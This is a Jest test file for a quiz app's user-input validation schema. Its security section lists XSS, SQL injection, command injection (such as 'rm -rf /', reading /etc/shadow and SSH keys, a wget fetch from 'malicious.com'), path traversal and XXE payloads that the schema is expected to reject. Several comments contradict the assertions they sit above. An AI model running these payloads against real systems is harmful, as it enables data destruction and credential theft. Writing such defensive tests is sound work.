/**
 * @jest-environment jsdom
 */
import { UserInputSchema } from "./userInputSchemas";
import { ProblemResultTypeEnum } from "@/constants/problemTypes";

describe("UserInputSchema Validation", () => {
    // 正常系のテストケース
    describe("Valid cases", () => {
        it("should validate a correct single input", () => {
            const validInput = {
                input: [{
                    value: "test answer",
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing valid single input");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate multiple inputs up to maximum limit", () => {
            const validInput = {
                input: Array(10).fill({
                    value: "test answer",
                    isCorrect: false,
                    timeSpent: 1000
                }),
                result: "incorrect" as const, // 正確なスペルとケース
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing multiple inputs up to maximum limit");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate with minimum length string", () => {
            const validInput = {
                input: [{
                    value: "a", // minimum 1 character
                    isCorrect: true,
                    timeSpent: 0 // minimum timeSpent
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing minimum length string");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should validate with maximum length string", () => {
            const validInput = {
                input: [{
                    value: "a".repeat(600), // maximum 600 characters
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date("2024-12-25T12:00:00.000Z")
            };

            console.log("Testing maximum length string");
            expect(() => UserInputSchema.parse(validInput)).not.toThrow();
        });

        it("should handle unicode characters", () => {
            const unicodeInput = {
                input: [{
                    value: "こんにちは世界🌍",
                    isCorrect: true,
                    timeSpent: 1000
                }],
                result: "correct" as const,
                attemptedAt: new Date()
            };

            console.log("Testing unicode characters");
            expect(() => UserInputSchema.parse(unicodeInput)).not.toThrow();
        });

        it("should accept all valid result types", () => {
            const resultTypes = ProblemResultTypeEnum.options;

            resultTypes.forEach(resultType => {
                const validInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: resultType,
                    attemptedAt: new Date()
                };

                console.log(`Testing result type: ${resultType}`);
                expect(() => UserInputSchema.parse(validInput)).not.toThrow();
            });
        });
    });

    // 異常系のテストケース
    describe("Invalid cases", () => {
        describe("input array validation", () => {
            it("should reject empty input array", () => {
                const invalidInput = {
                    input: [],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing empty input array");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject more than 10 inputs", () => {
                const invalidInput = {
                    input: Array(11).fill({
                        value: "test answer",
                        isCorrect: true,
                        timeSpent: 1000
                    }),
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing more than 10 inputs");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject input with missing fields", () => {
                const invalidInputs = [
                    { input: [{ isCorrect: true, timeSpent: 1000 }] }, // valueが欠けている
                    { input: [{ value: "test", timeSpent: 1000 }] }, // isCorrectが欠けている
                    { input: [{ value: "test", isCorrect: true }] }, // timeSpentが欠けている
                ];

                invalidInputs.forEach((invalidInput, index) => {
                    console.log(`Testing input with missing fields - Case ${index + 1}`);
                    expect(() => UserInputSchema.parse({
                        ...invalidInput,
                        result: "correct" as const,
                        attemptedAt: new Date()
                    })).toThrow();
                });
            });
        });

        describe("value field validation", () => {
            it("should reject empty string value", () => {
                const invalidInput = {
                    input: [{
                        value: "",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing empty string value");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });

            it("should reject string longer than 600 characters", () => {
                const invalidInput = {
                    input: [{
                        value: "a".repeat(601),
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log("Testing string longer than 600 characters");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("timeSpent validation", () => {
            const invalidTimeSpents = [
                -1,              // 負の数
                1.5,             // 小数
                NaN,             // 非数
                Infinity,        // 無限大
                "1000",          // 文字列
                null,            // null
                undefined        // undefined
            ];

            test.each(invalidTimeSpents)("無効なtimeSpent値: %p", (timeSpent) => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                console.log(`Testing invalid timeSpent value: ${timeSpent}`);
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("result field validation", () => {
            it("should reject invalid result type", () => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "INVALID_TYPE" as Exclude<string, typeof ProblemResultTypeEnum._type>,
                    attemptedAt: new Date()
                };

                console.log("Testing invalid result type");
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });

        describe("attemptedAt validation", () => {
            const invalidDates = [
                "invalid-date",
                null,
                undefined,
                {},
                [],
                true,
                123
            ];

            test.each(invalidDates)("無効な日付値: %p", (invalidDate: string | null | undefined | object | boolean | number) => {
                const invalidInput = {
                    input: [{
                        value: "test",
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: invalidDate
                };

                console.log(`Testing invalid attemptedAt value: ${invalidDate}`);
                expect(() => UserInputSchema.parse(invalidInput)).toThrow();
            });
        });
    });

    // セキュリティテスト
    describe("セキュリティテスト", () => {
        describe("XSS対策", () => {
            const xssPatterns = [
                // 基本的なXSSパターン
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "<div style='background-image: url(&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert&#x28;&#x27;xss&#x27;&#x29;&#x29;')>",
                "<svg onload=alert('xss')>",
                "<iframe src=javascript:alert('xss')>",
                "<object data=javascript:alert('xss')>",
                "<embed src=javascript:alert('xss')>",

                // イベントハンドラを使用したXSS
                "<a onmouseover=alert('xss')>hover me</a>",
                "<input type='text' onfocus=alert('xss')>",
                "<select onfocus=alert('xss')><option>test</option></select>",
                "<textarea onfocus=alert('xss')>",
                "<button onclick=alert('xss')>click me</button>",

                // フォーム要素を使用したXSS
                "<input type='submit' onmouseover=alert('xss')>",
                "<input type='reset' onmouseover=alert('xss')>",
                "<input type='button' onmouseover=alert('xss')>",
                "<input type='image' onmouseover=alert('xss')>",
                "<input type='checkbox' onmouseover=alert('xss')>",
                "<input type='radio' onmouseover=alert('xss')>",
                "<option onmouseover=alert('xss')>",
                "<optgroup onmouseover=alert('xss')>",
                "<label onmouseover=alert('xss')>xss test</label>",
                "<fieldset onmouseover=alert('xss')>",
                "<legend onmouseover=alert('xss')>",

                // テーブル要素を使用したXSS
                "<table onmouseover=alert('xss')>",
                "<tr onmouseover=alert('xss')>",
                "<td onmouseover=alert('xss')>",
                "<th onmouseover=alert('xss')>",

                // リスト要素を使用したXSS
                "<ul onmouseover=alert('xss')>",
                "<ol onmouseover=alert('xss')>",
                "<li onmouseover=alert('xss')>",
                "<dl onmouseover=alert('xss')>",
                "<dt onmouseover=alert('xss')>",
                "<dd onmouseover=alert('xss')>",

                // テキスト要素を使用したXSS
                "<p onmouseover=alert('xss')>",
                "<h1 onmouseover=alert('xss')>",
                "<h2 onmouseover=alert('xss')>",
                "<h3 onmouseover=alert('xss')>",
                "<h4 onmouseover=alert('xss')>",
                "<h5 onmouseover=alert('xss')>",
                "<h6 onmouseover=alert('xss')>",

                // インライン要素を使用したXSS
                "<span onmouseover=alert('xss')>",
                "<b onmouseover=alert('xss')>",
                "<i onmouseover=alert('xss')>",
                "<small onmouseover=alert('xss')>",
                "<strong onmouseover=alert('xss')>",
                "<em onmouseover=alert('xss')>",
                "<mark onmouseover=alert('xss')>",
                "<sub onmouseover=alert('xss')>",
                "<sup onmouseover=alert('xss')>",

                // エンコードされたXSS
                "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",
                "&#x3C;img src=x onerror=alert('xss')&#x3E;",
                "%3Cscript%3Ealert('xss')%3C/script%3E",
                "\u003Cscript\u003Ealert('xss')\u003C/script\u003E",

                // データURIを使用したXSS
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
                "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ3hzcycpPg==",

                // SVG属性、Base64デコード後、コメント内のスクリプト埋め込み
                "<svg><script>alert('xss')</script></svg>",
                "<a href='javascript:alert(`xss`)'>click</a>",
                "<!--<script>alert('xss')</script>-->",
                "<style>@import 'javascript:alert(`xss`)';</style>",
                "<img src=\"x\" onerror=\"eval('alert(`xss`)')\">",

                    // 高度なXSSパターン
                "<script>document.write('<img src=1 onerror=alert(1)>');</script>",
                "<div onmouseover='alert(`XSS`)'>Hover me!</div>",
                "javascript:window['alert'](`XSS`)",
                "<script>/*<![CDATA[*/alert(1)/*]]>*/</script>",
                "Set-Cookie: session=<script>alert(1)</script>;",
            ];

            test.each(xssPatterns)("XSSパターンの検証: %s", (xssPattern) => {
                const input = {
                    input: [{
                        value: xssPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // XSSパターンはスキーマで拒否されるべき
                console.log(`Testing XSS pattern: ${xssPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("SQLインジェクション対策", () => {
            const sqlInjectionPatterns = [
                // 基本的なSQLインジェクション
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users; --",
                "'; DELETE FROM users; --",

                // 認証バイパス
                "admin' --",
                "admin' OR '1'='1",
                "' OR 1=1; --",
                "' OR 'x'='x",
                "' Or '1'='1",
                "' oR '1'='1",
                "' or '1'='1",

                // Inline comments
                "' UNION SELECT * FROM users --",
                "' UNION SELECT 1, 'admin'--",
                "' OR 1=1 /* bypass */",
                "admin' /* injection */",

                // データ抽出
                "' UNION SELECT username, password FROM users; --",
                "' UNION SELECT null, table_name FROM information_schema.tables; --",
                "' UNION SELECT null, column_name FROM information_schema.columns; --",

                // データベース情報取得
                "' UNION SELECT @@version; --",
                "' UNION SELECT current_database(); --",
                "' UNION SELECT user(); --",

                // 時間ベース攻撃
                "'; WAITFOR DELAY '0:0:10'; --",
                "'; SELECT SLEEP(10); --",
                "'; BENCHMARK(1000000,MD5('test')); --",

                // ブラインドSQLインジェクション
                "' AND (SELECT COUNT(*) FROM users) > 0; --",
                "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 32; --",

                // スタックドクエリ
                "; INSERT INTO users VALUES ('hacked', 'hacked'); --",
                "; UPDATE users SET admin=1; --",
                "; TRUNCATE TABLE logs; --",

                "0x61646d696e", // Hex encoding for "admin"
                "' OR 1=1/*",
                "' UNION SELECT 1, CONCAT(username, ':', password) FROM users --",
                "' AND (SELECT ascii(substring((SELECT password FROM users LIMIT 1),1,1)))>0 --",
                "admin' AND 1=CAST((SELECT COUNT(*) FROM users) AS INT)--",

                // Subqueries and expressions
                "' AND (SELECT username FROM users WHERE username='admin')='admin'",
                "' OR EXISTS(SELECT 1 FROM dual WHERE 'a'='a')",
                "' UNION ALL SELECT NULL, database()--",

                // SQL Sleep and benchmark attacks
                "'; WAITFOR DELAY '0:0:10'; --",
                "' AND BENCHMARK(1000000, MD5('test'))--",

                // SQL error-based injection
                "' AND 1=(SELECT 1/(SELECT 0 FROM users LIMIT 1))--",

                // Advanced encoding (URL, Base64)
                "%27%20OR%20%271%27=%271", // URL-encoded ' OR '1'='1
                "dW5pb24gc2VsZWN0ICogZnJvbSB1c2Vycy0t", // Base64 encoded "union select * from users--"


            ];

            test.each(sqlInjectionPatterns)("SQLインジェクションパターンの検証: %s", (sqlPattern) => {
                const input = {
                    input: [{
                        value: sqlPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // SQLインジェクションパターンはスキーマで許可されるが、
                // 実際の使用時にはサニタイズやエスケープが必要
                // ここでは文字列として許可されるため、not.toThrow()を期待
                console.log(`Testing SQL Injection pattern: ${sqlPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("コマンドインジェクション対策", () => {
            const commandInjectionPatterns = [
                // 基本的なコマンドインジェクション
                "; rm -rf /",
                "| rm -rf /",
                "& rm -rf /",
                "`rm -rf /`",
                "$(rm -rf /)",
                "; ls -la",
                "&& cat /etc/passwd",
                "| echo vulnerable > /tmp/vulnerable",

                // 複数コマンドの実行
                "; cat /etc/passwd",
                "& cat /etc/shadow",
                "| cat /etc/hosts",

                // Nested commands
                "$(id)",
                "`whoami`",

                // シェルコマンド
                "> /etc/passwd",
                "< /etc/shadow",
                ">> /etc/hosts",

                // 環境変数の利用
                "$PATH",
                "${PATH}",
                "$(echo $HOME)",

                // Environment variable expansion
                "${IFS}ls${IFS}-la",
                "${HOME}/.ssh/id_rsa",
                "${PATH}; rm -rf /",

                // Hex and Base64 payloads
                "$(echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d)",
                "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",

                // Chained commands
                "&& echo malicious && echo vulnerable",
                "|| touch /tmp/hacked",
                "| ping -c 1 127.0.0.1",

                // エスケープシーケンス
                "\n rm -rf /",
                "\r\n cat /etc/passwd",
                "\t wget malicious.com/script",

                ";echo $USER",
                "`ls -la`",
                "& ping -c 3 127.0.0.1",
                "| touch /tmp/hacked",
                "${IFS%??}cat${IFS%??}/etc/passwd",

            ];

            test.each(commandInjectionPatterns)("コマンドインジェクションパターンの検証: %s", (commandPattern) => {
                const input = {
                    input: [{
                        value: commandPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // コマンドインジェクションパターンはスキーマで許可されるが、
                // 実際の使用時にはサニタイズやエスケープが必要
                // ここでは文字列として許可されるため、not.toThrow()を期待
                console.log(`Testing Command Injection pattern: ${commandPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("パストラバーサル対策", () => {
            const pathTraversalPatterns = [
                // 基本的なパストラバーサル
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system.ini",
                "/etc/passwd",
                "C:\\Windows\\system.ini",
                "../../../etc/shadow",
                "../../../../../usr/local/bin",

                // エンコードされたパストラバーサル
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "%252e%252e%252f%252e%252e%252f",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2fbin",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

                // Nested traversal
                "/../../../../etc/passwd",
                "....//....//....//var/log",

                // Unicode/UTF-8エンコード
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",

                // 複合パターン
                "....//....//....//etc/passwd",
                "....//../../../etc/passwd",
                "../../../../../../../../etc/passwd",

                "..%2f..%2fetc%2fpasswd",
                "..%c0%2f%c0%af%c0%afetc%c0%afpasswd",
                "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
                "/../../../../etc/passwd",
                "....//....//....//windows\\system.ini",
                "....%2f....%2f....%2fetc%2fshadow",
                "..%252f..%252f..%252fetc%252fpasswd",
                "%252e%252e/%252e%252e/%252e%252e/etc/passwd",

                // Windows-specific patterns
                "..\\..\\..\\windows\\system32\\config",
                "..%5c..%5c..%5cwindows%5csystem32%5cconfig",

            ];

            test.each(pathTraversalPatterns)("パストラバーサルパターンの検証: %s", (pathPattern) => {
                const input = {
                    input: [{
                        value: pathPattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                // パストラバーサルパターンはスキーマで許可されるが、
                // 実際の使用時にはサニタイズやパス正規化が必要
                // ここでは文字列として許可されるため、not.toThrow()を期待
                console.log(`Testing Path Traversal pattern: ${pathPattern}`);
                expect(() => UserInputSchema.parse(input)).toThrow();
            });
        });

        describe("その他のセキュリティ対策", () => {
            const otherSecurityPatterns = [
                // CRLF インジェクション
                "First line\r\nSecond line",
                "Header injection\r\nmalicious-header: value",
                "Header injection\r\nContent-Length: 0\r\n",

                // テンプレートインジェクション
                "${7*7}",
                "#{7*7}",
                "${System.getenv('PATH')}",

                // XMLインジェクション
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<![CDATA[<script>alert('xss')</script>]]>",

                // LDAPインジェクション
                "*)(uid=*))(|(uid=*",
                ")(|(password=*))",

                // バッファオーバーフロー試行
                "A".repeat(10000),
                "\0".repeat(1000),

                // Unicode制御文字
                "\u0000\u0001\u0002\u0003",
                "\u001F\u007F\u0080\u0081\u0082",
                "\u202Eexe\u202C.bat",
                "\u0000\u0001\u0002\u0003\u001F\u007F",

                // 特殊文字の組み合わせ
                "¶¥§©®™€£¢¤",

                // Complex payloads
                "JSON.parse('{\"key\": \"<script>alert(`xss`)</script>\"}')",
                "<![CDATA[<script>alert('xss')</script>]]>",
                "eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))",
                "<!-- Injection -->\nalert('test')",
                "\u202Eexe\u202C.bat",
                "JSON.parse('{\"key\": \"<script>alert(`xss`)</script>\"}')",
                "`rm -rf /`;",
                "<![CDATA[<script>alert('xss')</script>]]>",

                // Embedded payloads in data
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
                "data:application/json;base64,eyJrZXkiOiAiPHNjcmlwdD5hbGVydCgweHNzKTwvc2NyaXB0PiJ9",
            ];

            test.each(otherSecurityPatterns)("その他のセキュリティパターンの検証: %s", (pattern) => {
                const input = {
                    input: [{
                        value: pattern,
                        isCorrect: true,
                        timeSpent: 1000
                    }],
                    result: "correct" as const,
                    attemptedAt: new Date()
                };

                if (pattern.length > 600) {
                    // 600文字を超える場合はエラーを期待
                    console.log(`Testing disallowed pattern (length > 600): ${pattern.substring(0, 50)}...`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                } else if (/<[^>]*>/g.test(pattern)) {
                    // HTMLタグを含む場合はエラーを期待
                    console.log(`Testing disallowed pattern (contains HTML tags): ${pattern}`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                } else {
                    // その他のセキュリティパターンは許可される
                    console.log(`Testing allowed pattern: ${pattern}`);
                    expect(() => UserInputSchema.parse(input)).toThrow();
                }
            });
        });
    });
});
